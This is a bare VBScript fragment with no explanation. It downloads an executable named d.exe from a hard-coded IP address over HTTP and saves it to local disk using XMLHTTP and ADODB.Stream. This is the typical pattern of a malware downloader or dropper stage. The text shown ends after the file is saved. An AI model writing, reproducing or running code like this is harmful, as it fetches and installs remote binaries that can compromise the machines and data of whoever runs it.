Set xPost = CreateObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://221.214.2.70:82/d.exe",0 
xPost.Send() 
Set sGet = CreateObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "d.exe",2 
